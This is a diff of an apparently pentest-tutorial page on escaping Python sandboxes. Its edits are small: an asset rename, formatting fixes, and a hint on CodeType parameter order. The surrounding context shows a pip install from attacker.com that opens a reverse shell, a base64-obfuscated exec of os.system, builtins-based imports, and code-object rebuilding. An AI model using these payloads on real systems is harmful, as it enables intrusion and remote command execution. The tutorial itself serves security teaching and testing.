@@ -85,7 +85,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 
 You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
-{% file src="../../../.gitbook/assets/Reverse.tar.gz" %}
+{% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
 This package is called `Reverse`.However, it was specially crafted so when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
@@ -121,7 +121,7 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 * [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
 * [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
-If you can access to the**`__builtins__`** object you can import libraries (notice that you could also use here other string representation showed in last section):
+If you can access to the\*\*`__builtins__`\*\* object you can import libraries (notice that you could also use here other string representation showed in last section):
 
 ```python
 __builtins__.__import__("os").system("ls")
@@ -499,7 +499,7 @@ You can check the output of this script in this page:
 If you **send** a **string** to python that is going to be **formatted**, you can use `{}` to access **python internal information.** You can use the previous examples to access globals or builtins for example.
 
 {% hint style="info" %}
-However, there is a **limitation**, you can only use the symbols `.[]`, so you **won't be able to execute arbitrary code**, just to read information. \
+However, there is a **limitation**, you can only use the symbols `.[]`, so you **won't be able to execute arbitrary code**, just to read information.\
 _**If you know how to execute code through this vulnerability, please contact me.**_
 {% endhint %}
 
@@ -751,6 +751,7 @@ First of all, we need to know **how to create and execute a code object** so we 
 
 ```python
 code_type = type((lambda: None).__code__)
+# Check the following hint if you get an error in calling this
 code_obj = code_type(co_argcount, co_kwonlyargcount,
                co_nlocals, co_stacksize, co_flags,
                co_code, co_consts, co_names,
@@ -766,6 +767,16 @@ mydict = {}
 mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
+
+{% hint style="info" %}
+Depending on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
+
+```
+import types
+types.CodeType.__doc__
+'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
+```
+{% endhint %}
 
 ### Recreating a leaked function
 
